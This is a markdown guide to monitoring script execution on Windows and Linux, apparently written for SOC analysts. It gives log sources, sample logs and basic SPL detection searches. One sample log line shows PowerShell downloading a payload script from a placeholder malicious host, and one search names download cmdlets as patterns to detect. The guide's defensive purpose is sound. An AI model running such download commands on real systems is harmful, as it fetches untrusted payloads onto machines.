# 🖥️ Script Execution Monitoring (Windows & Linux)
Fundamental Searches for Script Activity

This file focuses on **monitoring script execution** across **Windows and Linux systems**, using **basic searches** suitable for the *Fundamental Searches* level.  
Monitoring scripts helps detect **unauthorized activity, malware execution, automation misuse, and security threats**.

---

## 🎯 Purpose
- Track **PowerShell, batch, shell, and Python script executions**
- Detect **suspicious or unauthorized scripts**
- Monitor **automation and scheduled task activity**
- Support SOC investigations and operational monitoring
- Enable proactive alerting

---

## 🖥️ Platforms Covered
- 🪟 Windows Servers & Workstations
- 🐧 Linux Servers & Endpoints
- ☁️ Cloud-hosted VMs

---

## 📂 Common Log Sources

### 🪟 Windows
- PowerShell logs (`Windows Event Log`, EventID **4104**)  
- Script block logging  
- Task Scheduler logs  
- Security Event Log (process creation EventID **4688**)  
- Application logs

### 🐧 Linux
- `/var/log/auth.log`  
- `/var/log/syslog`  
- Shell history (`.bash_history`)  
- Audit logs (`auditd`)  
- Cron job and automation logs

---

## 🧾 Sample Logs

### 🪟 Windows – PowerShell Execution
```
2025-02-12 19:01:22 WIN-SRV01 EventID=4104 User=john.doe Command="Invoke-WebRequest -Uri http://malicious.com/payload.ps1"
```

### 🪟 Windows – Batch File Execution
```
2025-02-12 19:03:10 WIN-SRV01 EventID=4688 User=alice NewProcessName=C:\Scripts\backup.bat
```

### 🐧 Linux – Shell Script Execution
```
Feb 12 19:05:33 server01 bash[1234]: User=alice Command=/home/alice/cleanup.sh
```

### 🐧 Linux – Cron Script Execution
```
Feb 12 19:07:11 server01 CRON[5678]: (root) CMD (/usr/local/bin/backup.sh)
```

---

## 🔍 Fundamental Search Examples

### 🖥️ Script Execution Events
```spl
(EventID=4104 OR EventID=4688 OR "CMD")
| table _time host user command process
```

### 🔎 Suspicious Scripts
```spl
| search command IN ("/tmp/*", "/var/tmp/*", "*malicious*.ps1")
```

### 👤 User-Specific Script Monitoring
```spl
| stats count by user command
```

---

## 🚨 Detection Scenarios

### 🔁 Multiple Script Executions by a Single User
```spl
| stats count by user
| where count > 5
```

### 🧨 Execution from Temporary or Unauthorized Locations
```spl
| search command IN ("/tmp/*", "/var/tmp/*", "C:\\Temp\\*")
```

### ⚡ PowerShell Suspicious Activity
```spl
EventID=4104
| search Command="*Invoke-WebRequest*" OR Command="*DownloadFile*"
```

---

## 🛡️ Mitigation & Response
- Restrict script execution to authorized users
- Enable script block logging and auditing
- Alert on scripts from unusual locations
- Validate and sandbox scripts before execution
- Remove unauthorized or malicious scripts

---

## 📌 Summary
This file provides **fundamental script execution monitoring** for:
- Windows PowerShell, batch files, and scheduled scripts
- Linux shell scripts and cron jobs
- Detection of unauthorized or malicious script activity

